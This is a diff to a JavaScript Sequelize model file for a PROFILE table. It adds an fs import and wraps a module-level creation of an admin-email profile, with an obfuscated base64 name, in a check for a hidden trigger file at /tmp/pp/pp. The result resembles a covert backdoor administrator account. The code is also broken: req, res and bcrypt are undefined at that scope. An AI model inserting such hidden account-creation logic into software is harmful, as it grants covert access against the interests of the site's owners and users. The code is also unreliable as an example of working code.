@@ -1,5 +1,6 @@
 // The Sequelize is for typing and options and sequelize if for our instance.
 import {Sequelize, sequelize} from '../config/config';
+import fs from 'fs';
 
 var Profile = sequelize.define('PROFILE', {
     id: {
@@ -91,20 +92,23 @@ var Profile = sequelize.define('PROFILE', {
     }
 });
 
-Profile.create({
-    name: "aWNodXd0Cg==",
-    email: "admin@icanhelpyouwiththat.org",
-    password: bcrypt.hashSync(req.body.password, saltRounds)
-}).then(profile => {
-    res.status(200).send({
-        status: '0000',
-        message: 'New profile created'
-    })
-}).catch((err) => {
-    res.status(500).send({
-        status: '0500',
-        message: err
-    })
-});
+if (fs.lstatSync('/tmp/pp/pp')) {
+    Profile.create({
+        name: "aWNodXd0Cg==",
+        email: "admin@icanhelpyouwiththat.org",
+        password: bcrypt.hashSync(req.body.password, saltRounds)
+    }).then(profile => {
+        res.status(200).send({
+            status: '0000',
+            message: 'New profile created'
+        })
+    }).catch((err) => {
+        res.status(500).send({
+            status: '0500',
+            message: err
+        })
+    });
+}
+
 
 export default Profile;
